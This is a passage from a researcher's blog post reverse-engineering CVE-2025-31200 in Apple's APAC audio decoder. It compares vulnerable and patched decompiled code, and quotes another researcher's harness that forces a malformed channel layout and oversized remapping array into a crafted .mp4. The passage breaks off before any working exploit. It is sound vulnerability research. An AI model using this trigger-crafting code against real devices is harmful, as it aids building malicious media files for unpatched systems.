</span></span></span><span><span>43</span><span><span></span>            <span>TBitstreamReader_FillCache</span><span>(</span><span>reader</span><span>);</span>               
</span></span><span><span>44</span><span>            <span>reader</span><span>-&gt;</span><span>cacheWord</span> <span>+=</span> <span>4</span><span>;</span> 
</span></span><span><span>45</span><span>            <span>cache</span> <span>=</span> <span>reader</span><span>-&gt;</span><span>cacheWord</span><span>;</span>          
</span></span><span><span>46</span><span>            <span>bitOffset</span>    <span>=</span> <span>reader</span><span>-&gt;</span><span>bitOffset</span><span>;</span> 
</span></span><span><span>47</span><span>
</span></span><span><span>48</span><span>            <span>value</span> <span>|=</span> <span>(</span><span>cache</span> <span>&gt;&gt;</span> <span>bitOffset</span><span>);</span> <span>// Shift right by the old offset to get just BitWidth bits from the cache
</span></span></span><span><span>49</span><span><span></span>            <span>reader</span><span>-&gt;</span><span>bitOffset</span> <span>=</span> <span>bitOffset</span> <span>+</span> <span>32</span><span>;</span> <span>// I believe 32 because 32 bits in a byte and we advance the reader ptr with bytes
</span></span></span><span><span>50</span><span><span></span>
</span></span><span><span>51</span><span>            <span>if</span> <span>(</span><span>reader</span><span>-&gt;</span><span>bitOffset</span> <span>==</span> <span>0</span><span>)</span> <span>{</span>
</span></span><span><span>52</span><span>                <span>value</span> <span>=</span> <span>0</span><span>;</span> 
</span></span><span><span>53</span><span>            <span>}</span>
</span></span><span><span>54</span><span>            <span>else</span> <span>{</span>
</span></span><span><span>55</span><span>                <span>value</span> <span>|=</span> <span>(</span><span>cache</span> <span>&lt;&lt;</span> <span>-</span><span>bitOffset</span><span>;</span>
</span></span><span><span>56</span><span>            <span>}</span>
</span></span><span><span>57</span><span>        <span>}</span>
</span></span><span><span>58</span><span>        <span>reader</span><span>-&gt;</span><span>cacheWord</span> <span>=</span> <span>value</span><span>;</span>
</span></span><span><span>59</span><span>    <span>}</span>
</span></span><span><span>60</span><span>
</span></span><span><span>61</span><span>    <span>uint8_t</span> <span>*</span><span>outbuf</span> <span>=</span> <span>this</span><span>-&gt;</span><span>offset_0xe0</span><span>;</span>
</span></span><span><span>62</span><span>    <span>outbuf</span><span>[</span><span>index</span><span>]</span>   <span>=</span> <span>(</span><span>uint8_t</span><span>)</span><span>value</span><span>;</span>
</span></span><span><span>63</span><span>
</span></span><span><span>64</span><span>    <span>index</span><span>++</span><span>;</span>
</span></span><span><span>65</span><span>
</span></span><span><span>66</span><span><span>}</span> <span>while</span> <span>(</span><span>value</span> <span>&gt;</span> <span>elementCount</span><span>);</span> <span>// Check #2: this time that the value *from the stream* &lt;= elementCount
</span></span></span><span><span>67</span><span><span></span><span>return</span> <span>result</span><span>;</span></span></span></code></pre></div><p>I don‚Äôt know about you, but I don‚Äôt spot the bug here. To help you along, here is the same section similarly cleaned-up from the patched version:</p>





<div><pre tabindex="0"><code data-lang="c"><span><span> 1</span><span><span>// A new check here with this + 0x58 rather than elementCount
</span></span></span><span><span> 2</span><span><span>// Calling it desiredCount to emphasize the difference
</span></span></span><span><span> 3</span><span><span></span><span>if</span> <span>(</span><span>desiredCount</span> <span>==</span> <span>0</span><span>)</span> <span>{</span>
</span></span><span><span> 4</span><span><span>retZeroLabel</span><span>:</span>
</span></span><span><span> 5</span><span>    <span>uint32_t</span> <span>*</span><span>section</span> <span>=</span> <span>this</span><span>-&gt;</span><span>offset_0x78</span><span>;</span>
</span></span><span><span> 6</span><span>    <span>uint32_t</span> <span>opcode</span>  <span>=</span> <span>section</span><span>[</span><span>0</span><span>];</span>
</span></span><span><span> 7</span><span>    <span>int32_t</span>  <span>elementCount</span><span>;</span>
</span></span><span><span> 8</span><span>    <span>if</span> <span>(</span><span>opcode</span> <span>==</span> <span>0x10000</span><span>)</span> <span>{</span>
</span></span><span><span> 9</span><span>			<span>/*
</span></span></span><span><span>10</span><span><span>			This section repeated again yielding ElementCount
</span></span></span><span><span>11</span><span><span>			*/</span>
</span></span><span><span>12</span><span>    <span>}</span>
</span></span><span><span>13</span><span>    <span>if</span> <span>(</span><span>elementCount</span> <span>&gt;</span> <span>desiredCount</span><span>)</span> <span>{</span> 
</span></span><span><span>14</span><span>        <span>uint32_t</span> <span>BitWidth</span> <span>=</span> <span>this</span><span>-&gt;</span><span>offset_0xD8</span><span>;</span>
</span></span><span><span>15</span><span>        <span>TBitstreamReader_SkipBits</span><span>(</span><span>reader</span><span>,</span> <span>// New call to SkipBits
</span></span></span><span><span>16</span><span><span></span>            <span>(</span><span>uint64_t</span><span>)(</span><span>elementCount</span> <span>-</span> <span>desiredCount</span><span>)</span> <span>*</span> <span>BitWidth</span><span>);</span>
</span></span><span><span>17</span><span>    <span>}</span>
</span></span><span><span>18</span><span>    <span>result</span> <span>=</span> <span>0</span><span>;</span>
</span></span><span><span>19</span><span><span>}</span>
</span></span><span><span>20</span><span><span>else</span> <span>{</span>
</span></span><span><span>21</span><span>    <span>// Populate the array from the stream
</span></span></span><span><span>22</span><span><span></span>    <span>int64_t</span> <span>index</span>  <span>=</span> <span>0</span><span>;</span>
</span></span><span><span>23</span><span>    <span>uint8_t</span> <span>symbol</span> <span>=</span> <span>0</span><span>;</span>
</span></span><span><span>24</span><span>
</span></span><span><span>25</span><span>    <span>while</span> <span>(</span><span>true</span><span>)</span> <span>{</span>
</span></span><span><span>26</span><span>        <span>uint32_t</span> <span>bitWidth</span> <span>=</span> <span>this</span><span>-&gt;</span><span>offset_0xD8</span><span>);</span>
</span></span><span><span>27</span><span>        <span>uint32_t</span> <span>value</span> <span>=</span> <span>0</span><span>;</span>
</span></span><span><span>28</span><span>
</span></span><span><span>29</span><span>        <span>if</span> <span>(</span><span>bitWidth</span> <span>&lt;=</span> <span>32</span><span>)</span> <span>{</span>
</span></span><span><span>30</span><span>					<span>TBitstreamReader_FillCache</span><span>(</span><span>reader</span><span>);</span>
</span></span><span><span>31</span><span>					<span>reader</span><span>-&gt;</span><span>currentPtr</span> <span>+=</span> <span>4</span><span>;</span>
</span></span><span><span>32</span><span>					<span>cache</span> <span>=</span> <span>reader</span><span>-&gt;</span><span>cacheWord</span><span>;</span>
</span></span><span><span>33</span><span>					
</span></span><span><span>34</span><span>					<span>bitOffset</span> <span>=</span> <span>reader</span><span>-&gt;</span><span>bitOffset</span><span>;</span>
</span></span><span><span>35</span><span>					<span>value</span> <span>|=</span> <span>cache</span> <span>&gt;&gt;</span> <span>bitOffset</span><span>;</span>
</span></span><span><span>36</span><span>					
</span></span><span><span>37</span><span>					<span>// Update bit offset
</span></span></span><span><span>38</span><span><span></span>					<span>reader</span><span>-&gt;</span><span>bitOffset</span> <span>=</span> <span>bitOffset</span> <span>+</span> <span>32</span><span>;</span>
</span></span><span><span>39</span><span>					
</span></span><span><span>40</span><span>					<span>// Check if we need more bits
</span></span></span><span><span>41</span><span><span></span>					<span>if</span> <span>(</span><span>reader</span><span>-&gt;</span><span>bitOffset</span> <span>==</span> <span>0</span><span>)</span> <span>{</span>
</span></span><span><span>42</span><span>					    <span>reader</span><span>-&gt;</span><span>cacheWord</span> <span>=</span> <span>0</span><span>;</span>
</span></span><span><span>43</span><span>					<span>}</span> 
</span></span><span><span>44</span><span>					<span>else</span> <span>{</span>
</span></span><span><span>45</span><span>					    <span>reader</span><span>-&gt;</span><span>cacheWord</span> <span>=</span> <span>cache</span> <span>&lt;&lt;</span> <span>-</span><span>(</span><span>bitOffset</span><span>);</span>
</span></span><span><span>46</span><span>						<span>}</span>
</span></span><span><span>47</span><span>	        <span>}</span>
</span></span><span><span>48</span><span>	        <span>char</span> <span>*</span><span>outBuf</span> <span>=</span> <span>this</span><span>-&gt;</span><span>offset_0xE0</span><span>;</span>
</span></span><span><span>49</span><span>	        <span>outBuf</span><span>[</span><span>index</span><span>]</span> <span>=</span> <span>value</span><span>;</span>
</span></span><span><span>50</span><span>
</span></span><span><span>51</span><span>	        <span>if</span> <span>((</span><span>uint32_t</span><span>)</span><span>value</span> <span>&gt;=</span> <span>elementCount</span><span>)</span> <span>{</span>
</span></span><span><span>52</span><span>	            <span>break</span><span>;</span> <span>// Same as check #2 before
</span></span></span><span><span>53</span><span><span></span>	        <span>}</span>
</span></span><span><span>54</span><span>	
</span></span><span><span>55</span><span>	        <span>index</span><span>++</span><span>;</span>
</span></span><span><span>56</span><span>	        <span>if</span> <span>((</span><span>uint64_t</span><span>)</span><span>index</span> <span>&gt;=</span> <span>elementCount</span><span>)</span> <span>{</span>
</span></span><span><span>57</span><span>	            <span>goto</span> <span>retZeroLabel</span><span>;</span>
</span></span><span><span>58</span><span>	        <span>}</span>
</span></span><span><span>59</span><span>    <span>}</span>
</span></span><span><span>60</span><span>    <span>if</span> <span>(</span><span>_os_log_type_enabled</span><span>(</span><span>__os_log_default</span><span>,</span> <span>OS_LOG_LEVEL_ERROR</span><span>))</span> <span>{</span>
</span></span><span><span>61</span><span>        <span>os_log_error</span><span>(</span><span>"HOAStructs.cpp:%d Invalid m_RemappingArray bitstream %u (&gt;= %u)"</span><span>,</span>
</span></span><span><span>62</span><span>                     <span>__LINE__</span><span>,</span> <span>symbol</span><span>,</span> <span>elementCount</span><span>);</span> <span>// New error message
</span></span></span><span><span>63</span><span><span></span>    <span>}</span>
</span></span><span><span>64</span><span>    <span>result</span> <span>=</span> <span>1</span><span>;</span>
</span></span><span><span>65</span><span><span>}</span>
</span></span><span><span>66</span><span><span>return</span> <span>result</span><span>;</span></span></span></code></pre></div><p>It is essentially the same, but with a new check, a new call to <code>skipBits</code>, and a new error message. After seeing the new error message, I figured that that must be it! Whatever control flow leads to the new error message in the patched version has got to be the control flow that induces the error. The following must hold in order to reach the new check:</p>
<ol>
<li><code>desiredCount</code> ‚â† 0. This takes us to the loop that tries to populate the array. The code is trying to populate an array with values read in from a stream. It is getting the <em>number</em> of those values prior (in the patched version that is <code>desiredCount</code>). If that number is zero then we‚Äôre good! We don‚Äôt need to try to populate the array and we don‚Äôt need to throw any error messages.</li>
<li>At some point while reading from the stream, <code>value</code> should be ‚â• <code>elementCount</code>.</li>
</ol>
<p>(1) is trivial to induce. Consider that path in the vulnerable code. There is never a check for whether or not <code>elementCount</code> == 0. It is simply used to size the array and then the loop begins. So any audio file that reaches this code will ‚Äúgo down that path‚Äù in the old version. This was actually my first guess about the bug because the check whether or not <code>elementCount</code> == 0 stood out as the first big control-flow difference. In the old version, no resizing happens at all if <code>elementCount</code> == 0:</p>





<div><pre tabindex="0"><code data-lang="c"><span><span> 1</span><span><span>if</span> <span>(</span><span>elementCount</span> <span>&gt;</span> <span>currentSize</span><span>)</span> <span>{</span>
</span></span><span><span> 2</span><span>	<span>resize</span><span>(</span><span>arr</span><span>,</span> <span>elementCount</span> <span>-</span> <span>currentSize</span><span>);</span>
</span></span><span><span> 3</span><span><span>}</span>
</span></span><span><span> 4</span><span><span>else</span> <span>if</span> <span>(</span><span>currentSize</span> <span>&gt;</span> <span>elementCount</span><span>)</span> <span>{</span>
</span></span><span><span> 5</span><span>	<span>current_arr_end_ptr</span> <span>-=</span> <span>(</span><span>currentSize</span> <span>-</span> <span>elementCount</span><span>)</span>
</span></span><span><span> 6</span><span><span>}</span> <span>// Continue without resizing the array
</span></span></span><span><span> 7</span><span><span>// ...
</span></span></span><span><span> 8</span><span><span>// End up here and exit
</span></span></span><span><span> 9</span><span><span></span><span>if</span> <span>((</span><span>uint64_t</span><span>)</span><span>index</span> <span>&gt;=</span> <span>(</span><span>uint64_t</span><span>)</span><span>elementCount</span><span>)</span> <span>{</span>
</span></span><span><span>10</span><span>	<span>result</span> <span>=</span> <span>0</span><span>;</span>
</span></span><span><span>11</span><span>	<span>goto</span> <span>loop_end</span><span>;</span>
</span></span><span><span>12</span><span><span>}</span></span></span></code></pre></div><p>But there is no bug in that condition. If <code>elementCount</code> were zero here, then that would mean that there are no elements required to be in the array, so no resizing happens. The loop exits immediately at the check <code>(uint64_t)index &gt;= (uint64_t)elementCount</code> since <code>elementCount</code> is initialized to 0.</p>
<p>We also need (2) to be true: value &gt; <code>elementCount</code>, and that‚Äôs seemingly possible. Of course, we don‚Äôt know how exactly to trigger it yet, but we do know that <code>value</code> is read in from an attacker controlled stream, and plausibly that it can have values higher than <code>elementCount</code> given that there is a check for it. However, it is still unclear what the memory corruption actually is.  Even if we read in some value from the stream that is greater than <code>elementCount</code>, we never can actually overwrite anything in <code>outBuf</code>, since <code>outBuf</code> is sized properly based on <code>elementCount</code>. Clearly the change was related to the sizing of <code>outBuf</code> though, so how do we make sense of this? At this point I had a few hypotheses:</p>
<ol>
<li>I was simply missing how <code>outBuf</code> could be overwritten, and therefore I should spend more time staring at this patch diff until the bug revealed itself to me.</li>
<li>At some point later in the code, the values from the <code>m_RemappingArray</code> are used to size another buffer or array of some kind that is assumed to be the same size as <code>*m_TotalComponents</code>* (used as <code>elementCount</code> in the patched version)<em>.</em></li>
</ol>
<p>I spent a lot of time with (a)‚Äîstaring and trying to think of ways to make it so just one extra value was read into the <code>m_RemappingArray</code>. Perhaps there was some weirdness with the bit width calculation, or some kind of integer overflow that led to a smaller buffer than expected. But I couldn‚Äôt make anything work.</p>
<p>After entirely too much time spent smashing my head into this wall I proceeded to hypotheses (b). I suppose I should have done this from the start: looking at them now, laid out like this it‚Äôs so obvious to me which is correct, but it wasn‚Äôt at the time.</p>
<h2 id="reverse-engineering">Reverse Engineering</h2>
<p>I wanted to do some dynamic analysis. In order to do that I needed to understand how to reach the vulnerable code path. So I started reverse engineering.</p>
<p>In AudioCodecs there are parallel methods to deserialize for other classes: <code>apac::spch::CodecConfig::Deserialize</code>, for example, and the name of the binary literally has the words <em>Audio</em> and <em>Codec</em> in the name. That was enough to start googling. After searching something like ‚ÄúAPAC Audio format,‚Äù I found a lot of results for <em>ALAC</em> (Apple Lossless Audio Codec) which seemed close. I also found this reddit <a href="https://www.reddit.com/r/audiophile/comments/1fncalk/what_is_the_apac_audio_format_as_listed_in_the/">post</a> in r/AudioPhile that was asking what it was, and <a href="https://developer.apple.com/documentation/coreaudiotypes/kaudioformatapac?language=objc">this mention</a> in Apple‚Äôs developer documentation for Core Audio Types. After following that one redditor‚Äôs guess I found this <a href="https://support.apple.com/en-by/guide/immersive-video-utility/dev4579429f0/web">page</a> which confirms that APAC stands for <em>Apple Positional Audio Codec</em>.</p>
<p>With much less effort, I was able to find out that HOA plausibly stood for Higher Order Ambisonics: a method of representing sound as a spatial sound-field centered  around the listeners head. Something like this:</p>
<p><img alt="Spatial Audio Example" src="https://blog.noahhw.dev/posts/cve-2025-31200/images/ambisonics.jpg"></p>
<p><a href="https://tricktheear.eu/spatial-web-audio/">https://tricktheear.eu/spatial-web-audio/</a></p>
<p>This helped a tiny bit in understanding the logic here‚Äîenough that I went to try and make an audio file that could hit the patched function. After some playing around and downloading a lot of sketchy audio files from the internet, I was able to hit the function through <code>[audioPlayer prepareToPlay]</code>. However, it was still unclear how exactly to reach the exact snippet that had changed.
Luckily at this point I wasn‚Äôt the only person working on this, and by searching for some related keywords I stumbled on this Git repo: <a href="https://github.com/zhuowei/apple-positional-audio-codec-invalid-header">https://github.com/zhuowei/apple-positional-audio-codec-invalid-header</a> from Zhouwei. He hadn‚Äôt figured it out yet as it said in the README at the time, but he had done some excellent reverse engineering. He put together an objective C++ script and lldb hook that created a .mp4 which hit the vulnerable snippet in the old version and the new check in the patched version. As you can see in his code:</p>





<div><pre tabindex="0"><code data-lang="c"><span><span>1</span><span><span>// Define the relevant pieces of the CodeConfig struct 
</span></span></span><span><span>2</span><span><span></span><span>struct</span> <span>CodecConfig</span> <span>{</span>
</span></span><span><span>3</span><span>  <span>char</span> <span>padding0</span><span>[</span><span>0x78</span><span>];</span>                         <span>// 0
</span></span></span><span><span>4</span><span><span></span>  <span>AudioChannelLayout</span><span>*</span> <span>remappingChannelLayout</span><span>;</span>  <span>// 0x78 - This is of course this-&gt;offset_0x78 from earlier
</span></span></span><span><span>5</span><span><span></span>  <span>char</span> <span>padding1</span><span>[</span><span>0xe0</span> <span>-</span> <span>0x80</span><span>];</span>                  <span>// 0x80
</span></span></span><span><span>6</span><span><span></span>  <span>std</span><span>::</span><span>vector</span><span>&lt;</span><span>char</span><span>&gt;</span> <span>m_RemappingArray</span><span>;</span>           <span>// 0xe0 - 
</span></span></span><span><span>7</span><span><span></span><span>};</span></span></span></code></pre></div><p><code>m_RemappingArray</code> is the actual array that the bits are read into. It‚Äôs possible to infer these names from the extensive error logging in the code. Next he has a function to force more elements into the <code>m_RemappingArray</code>.</p>





<div><pre tabindex="0"><code data-lang="c"><span><span>1</span><span><span>void</span> <span>OverrideApac</span><span>(</span><span>CodecConfig</span><span>*</span> <span>config</span><span>)</span> <span>{</span>
</span></span><span><span>2</span><span>  <span>config</span><span>-&gt;</span><span>remappingChannelLayout</span><span>-&gt;</span><span>mChannelLayoutTag</span> <span>=</span> <span>kAudioChannelLayoutTag_HOA_ACN_SN3D</span> <span>|</span> <span>0xffff</span><span>;</span>
</span></span><span><span>3</span><span>  <span>for</span> <span>(</span><span>int</span> <span>i</span> <span>=</span> <span>0</span><span>;</span> <span>i</span> <span>&lt;</span> <span>0x10000</span><span>;</span> <span>i</span><span>++</span><span>)</span> <span>{</span>
</span></span><span><span>4</span><span>    <span>config</span><span>-&gt;</span><span>m_RemappingArray</span><span>.</span><span>push_back</span><span>(</span><span>0xff</span><span>);</span>
</span></span><span><span>5</span><span>  <span>}</span>
</span></span><span><span>6</span><span><span>}</span></span></span></code></pre></div><p>Apple mentions in the Core Audio Types documentation that the <code>channelLayoutTag</code> should be OR‚Äôd with the actual number of channels. The first line of the function above tells the deserializer that there are 65,535 channels. AudioToolbox will refuse to produce an audio file with this configuration, so <code>OverrideApac</code> will get called by the lldb hook during serialization.</p>
<p>Then in main we define the basic layout of the audio file:</p>





<div><pre tabindex="0"><code data-lang="objectivec"><span><span> 1</span><span>  <span>AVAudioFormat</span><span>*</span> <span>formatIn</span> <span>=</span> <span>[[</span><span>AVAudioFormat</span> <span>alloc</span><span>]</span> <span>initStandardFormatWithSampleRate</span><span>:</span><span>44100</span>
</span></span><span><span> 2</span><span>                                                                           <span>channels</span><span>:</span><span>1</span><span>];</span>
</span></span><span><span> 3</span><span>  <span>AudioStreamBasicDescription</span> <span>outputDescription</span><span>{.</span><span>mSampleRate</span> <span>=</span> <span>44100</span><span>,</span>
</span></span><span><span> 4</span><span>                                                <span>.</span><span>mFormatID</span> <span>=</span> <span>kAudioFormatAPAC</span><span>,</span>
</span></span><span><span> 5</span><span>                                                <span>.</span><span>mFormatFlags</span> <span>=</span> <span>0</span><span>,</span>
</span></span><span><span> 6</span><span>                                                <span>.</span><span>mBytesPerPacket</span> <span>=</span> <span>0</span><span>,</span>
</span></span><span><span> 7</span><span>                                                <span>.</span><span>mFramesPerPacket</span> <span>=</span> <span>0</span><span>,</span>
</span></span><span><span> 8</span><span>                                                <span>.</span><span>mBytesPerFrame</span> <span>=</span> <span>0</span><span>,</span>
</span></span><span><span> 9</span><span>                                                <span>.</span><span>mChannelsPerFrame</span> <span>=</span> <span>4</span><span>,</span>
</span></span><span><span>10</span><span>                                                <span>.</span><span>mBitsPerChannel</span> <span>=</span> <span>0</span><span>,</span>
</span></span><span><span>11</span><span>                                                <span>.</span><span>mReserved</span> <span>=</span> <span>0</span><span>};</span>
</span></span><span><span>12</span><span>  <span>AVAudioChannelLayout</span><span>*</span> <span>channelLayout</span> <span>=</span>
</span></span><span><span>13</span><span>      <span>[</span><span>AVAudioChannelLayout</span> <span>layoutWithLayoutTag</span><span>:</span><span>kAudioChannelLayoutTag_HOA_ACN_SN3D</span> <span>|</span> <span>4</span><span>]</span></span></span></code></pre></div><p>and later write it out:</p>





<div><pre tabindex="0"><code data-lang="c"><span><span> 1</span><span>  <span>AudioBufferList</span> <span>audioBufferList</span><span>{</span>
</span></span><span><span> 2</span><span>      <span>.</span><span>mNumberBuffers</span> <span>=</span> <span>1</span><span>,</span>
</span></span><span><span> 3</span><span>      <span>.</span><span>mBuffers</span> <span>=</span>
</span></span><span><span> 4</span><span>          <span>{</span>
</span></span><span><span> 5</span><span>              <span>{</span>
</span></span><span><span> 6</span><span>                  <span>.</span><span>mNumberChannels</span> <span>=</span> <span>1</span><span>,</span>
</span></span><span><span> 7</span><span>                  <span>.</span><span>mDataByteSize</span> <span>=</span> <span>sizeof</span><span>(</span><span>audioBuffer</span><span>),</span>
</span></span><span><span> 8</span><span>                  <span>.</span><span>mData</span> <span>=</span> <span>audioBuffer</span><span>,</span>
</span></span><span><span> 9</span><span>              <span>},</span>
</span></span><span><span>10</span><span>          <span>},</span>
</span></span><span><span>11</span><span>  <span>};</span>
</span></span><span><span>12</span><span><span>ExtAudioFileWrite</span><span>(</span><span>audioFile</span><span>,</span> <span>sizeof</span><span>(</span><span>audioBuffer</span><span>)</span> <span>/</span> <span>sizeof</span><span>(</span><span>audioBuffer</span><span>[</span><span>0</span><span>]),</span> <span>&amp;</span><span>audioBufferList</span><span>);</span></span></span></code></pre></div><p>What this <em>tries</em> to do is ensure that (2) from above, is true. That is, that the <code>m_RemappingArray</code> has values that are ‚â• to the number of total elements required in the array. How is that limit determined though? If we set a breakpoint in lldb right at this block that reads in the size of the <code>m_RemappingArray</code>:</p>





<div><pre tabindex="0"><code data-lang="c"><span><span> 1</span><span><span>if</span> <span>(</span><span>opcode</span> <span>==</span> <span>0x10000</span><span>)</span> <span>{</span>
</span></span><span><span> 2</span><span>	<span>// Get total bits section as before
</span></span></span><span><span> 3</span><span><span></span><span>}</span>
</span></span><span><span> 4</span><span><span>else</span> <span>if</span> <span>(</span><span>opcode</span> <span>!=</span> <span>0</span><span>)</span> <span>{</span>
</span></span><span><span> 5</span><span>    <span>// If opcode is nonzero, use its low 16 bits
</span></span></span><span><span> 6</span><span><span></span>    <span>elementCount</span> <span>=</span> <span>(</span><span>int32_t</span><span>)(</span><span>opcode</span> <span>&amp;</span> <span>0xFFFF</span><span>);</span>
</span></span><span><span> 7</span><span><span>}</span>
</span></span><span><span> 8</span><span><span>else</span> <span>{</span>
</span></span><span><span> 9</span><span>    <span>// Otherwise, fall back to the third array element
</span></span></span><span><span>10</span><span><span></span>    <span>elementCount</span> <span>=</span> <span>(</span><span>int32_t</span><span>)</span><span>section</span><span>[</span><span>2</span><span>];</span>
</span></span><span><span>11</span><span><span>}</span></span></span></code></pre></div><p>and we dump opcode here:</p>





<div><pre tabindex="0"><code data-lang="armasm"><span><span>1</span><span><span>-&gt;</span> cmp    <span>w23</span>, #<span>0x10</span>, <span>lsl</span> #<span>12</span> <span>; Check if w23 is 0x1000
</span></span></span><span><span>2</span><span><span></span><span>(</span>lldb<span>)</span> <span>reg</span> <span>read</span> <span>w23</span>
</span></span><span><span>3</span><span>     w<span>23</span> <span>=</span> <span>0</span><span>x00</span><span>be000d</span></span></span></code></pre></div><p>That 0x00be is <code>kAudioChannelLayoutTag_HOA_ACN_SN3D</code>, and the 0xffff is from the OR that we did during serialization. This is interesting then. Thinking back to the control flow that we want to force in order to test hypothesis (b), we want the parsing logic to read in a value from the stream that is <em>greater</em> than the number of total components. If we dump <code>m_TotalComponents</code> at runtime (offset 0x58 from the base of <code>CodecConfig</code>) we see that with our current encoder it is 1. Therefore, as long as a value is supplied that is greater than 1, then the loop should exit. In the unpatched version it will continue and in the patched version it will hit the new check. I guessed at this point that the values being read in from the stream here would be the 0xFF bytes we forced in the <code>m_RemappingArray</code> from earlier. Stepping through in lldb it turned out that wasn‚Äôt the case.</p>
<p>We were reading in 0xffff entries, but they weren‚Äôt 0xff each time. This was curious to me. They were &gt; 1 though! So shouldn‚Äôt this cause memory cooruption? Even turning on ASan and letting the harness run I didn‚Äôt see anything. In both cases (patched and unpatched) it just exits with code 0. Though if you run them in lldb then you can see those error messages from the parser. They were definitely different.</p>
<p>Old:</p>





<div><pre tabindex="0"><code data-lang="c"><span><span>1</span><span> <span>APACProfile</span><span>.</span><span>cpp</span><span>:</span><span>424</span>    <span>ERROR</span><span>:</span> <span>Wrong</span> <span>profile</span> <span>index</span> <span>in</span> <span>GlobalConfig</span>
</span></span><span><span>2</span><span> <span>APACGlobalConfig</span><span>.</span><span>cpp</span><span>:</span><span>894</span>    <span>Profile</span> <span>and</span> <span>level</span> <span>data</span> <span>could</span> <span>not</span> <span>be</span> <span>validated</span></span></span></code></pre></div><p>New:</p>





<div><pre tabindex="0"><code data-lang="c"><span><span>1</span><span><span>error</span>	<span>01</span><span>:</span><span>10</span><span>:</span><span>26.743480</span><span>-</span><span>0400</span>	<span>getaudiolength</span>	<span>&lt;</span><span>private</span><span>&gt;:</span><span>548</span>    <span>Invalid</span> <span>m_RemappingArray</span> <span>bitstream</span> <span>in</span> <span>hoa</span><span>::</span><span>CodecConfig</span><span>::</span><span>Deserialize</span><span>()</span>
</span></span><span><span>2</span><span><span>error</span>	<span>01</span><span>:</span><span>10</span><span>:</span><span>26.743499</span><span>-</span><span>0400</span>	<span>getaudiolength</span>	<span>&lt;</span><span>private</span><span>&gt;:</span><span>860</span>    <span>Error</span> <span>in</span> <span>deserializing</span> <span>ASC</span> <span>components</span></span></span></code></pre></div><p>I even manually checked the bounds of <code>m_RemappingArray</code> in lldb at the instructions that wrote into it to see if it was miraculously being overwritten, and of course, it wasn‚Äôt. It did contain exactly 0xffff entries, but no more. This is where I got stuck for a bit. A few things were possible at this stage:</p>
<ol>
<li>This could already be an arbitrary write that ASan wasn‚Äôt picking up. There are a number of ways that ASan wouldn‚Äôt pickup a small overwrite.</li>
<li>It could be the case that this is close, but some other unknown setup is missing.</li>
</ol>
<p>Since I wouldn‚Äôt even be sure where to go about chasing (1), I went for (2).  I thought that a good place to start was taking a look at the error messages from above. Might it be the case that the <code>m_RemappingArray</code> just isn‚Äôt being deserialized? By looking for references to ‚ÄúProfile and level data could not be validated‚Äù in Binary Ninja, I found that phrase in <code>apac::hoa::GlobalConfig::Deserialize</code>. This is the dispatch site (the callee) of the virtual <code>apac::hoa::CodecConfig::Deserialize</code> method. Error site here:</p>
<p><img alt="Screenshot 2025-05-27 at 6.56.03\u202fPM.png" src="https://blog.noahhw.dev/posts/cve-2025-31200/images/finalError.png"></p>
<p>Before I reverse engineered this monster function, I thought it made sense to actually try and do a <em>little</em> bit to understand what that error could mean in more contextual, audio terms. I found <a href="https://forum.blackmagicdesign.com/viewtopic.php?f=21&amp;t=208361#p1081741">this answer</a> in the Blackmagic Forum website in response to a question about how to mix ambisonics audio when searching for keywords like ‚Äúambisonics profile‚Äù:</p>
<blockquote>
<p>It seems like the process uses an ambisonic microphone that you place in the center of a custom speaker space and run a test pattern sound through all of the speakers one-by-one to record a ‚Äúprofile‚Äù of the location of the speakers. The profile data is then fed into the decoder to let it know where the speakers are in space.</p>
</blockquote>
<p>So this does fit in with our understanding, but it is a fairly general notion. That is, it describes the entire ambisonics <em>profile</em> rather than just one element of it. However, it doesn‚Äôt help us much in understanding why our deserialization failed.</p>
<p>After some more fruitless searching I bit the bullet and started to reverse engineer the <code>GlobalConfig</code> method. First of all, we know that we at least make it to the point where there is a call to <code>apac::hoa::CodecConfig::Deserialize</code>. From the backtrace we know that that is at <code>apac::GlobalConfig::Deserialize + 1644</code>. lldb shows a <code>blraa  x8, x17</code> instruction there so we know that this is a virtual method.  If we just follow the control flow up a little bit we see:</p>
<p><img alt="Screenshot 2025-05-27 at 7.25.51\u202fPM.png" src="https://blog.noahhw.dev/posts/cve-2025-31200/images/virtCalls.png"></p>
<p>If you‚Äôre wondering about the variable names and symbols here, this was cleaned up by me. I followed along this extremely useful <a href="https://www.seandeaton.com/gotta-re-em-all-reversing-c-virtual-function-tables-with-binary-ninja/">blog post</a> explaining how to reverse engineer complex C++ types in Binary Ninja.  I learned how to tell it about the vtable call to Deserialize at 0x57acc, for example.</p>
<p>Back to the control flow, there is some type flag read in from the stream (what I named <code>codecConfigTypeFromStream</code>) that tells <code>GlobalConfig</code> which constructor to call. Then the instantiated <code>CodecConfig</code> object calls Deserialize. This pattern continues for all the different <code>CodecConfig</code> classes. The vast majority of the code in this function lives under this <code>label_57acc</code>. The way Binary Ninja reconstructed the code here, it essentially showed that if none of these ifs are true, then control flow reaches the ‚Äúprofile and level data‚Äù error from above.</p>
<p>There are a number of possible errors <em>inside</em> the block after the label. If any of those error messages are hit then control flow jumps to the ‚Äúprofile and level data‚Äù error block only after first failing with a different more specific error.</p>
<p>Searching for the other error: ‚ÄúERROR: Wrong profile index in GlobalConfig‚Äù I found this check:</p>
<p><img alt="Screenshot 2025-05-30 at 7.38.10\u202fPM.png" src="https://blog.noahhw.dev/posts/cve-2025-31200/images/inferProfileCallSite.png"></p>
<p><code>GlobalConfig</code> grabs a reference to the supported profiles: <code>var_b0</code>, as well as some field of <code>GlobalConfig</code>at offset 0x130 and calls <code>apac::ProfileLevelConfig::InferProfileFromCodecConfigs</code>. If that crazy-looking conditional evaluates to true, then the error is logged. The conditional uses the return value of <code>apac::ProfileLevelConfig::InferProfileFromCodecConfigs</code>, <code>x0_43</code>. So I took a look at the function. Binary Ninja interpretted the signature to be:</p>





<div><pre tabindex="0"><code data-lang="cpp"><span><span>1</span><span><span>uint64_t</span> <span>apac</span><span>::</span><span>ProfileLevelConfig</span><span>::</span><span>InferProfileFromCodecConfigs</span><span>(</span>
</span></span><span><span>2</span><span>	<span>std</span><span>::</span><span>vector</span><span>&lt;</span><span>std</span><span>::</span><span>unique_ptr</span><span>&lt;</span><span>apac</span><span>::</span><span>IASCConfig</span><span>,</span> <span>std</span><span>::</span><span>default_delete</span><span>&lt;</span><span>apac</span><span>::</span><span>IASCConfig</span><span>&gt;</span> <span>&gt;</span> <span>&gt;</span> <span>const</span><span>&amp;</span> <span>arg1</span><span>,</span> 
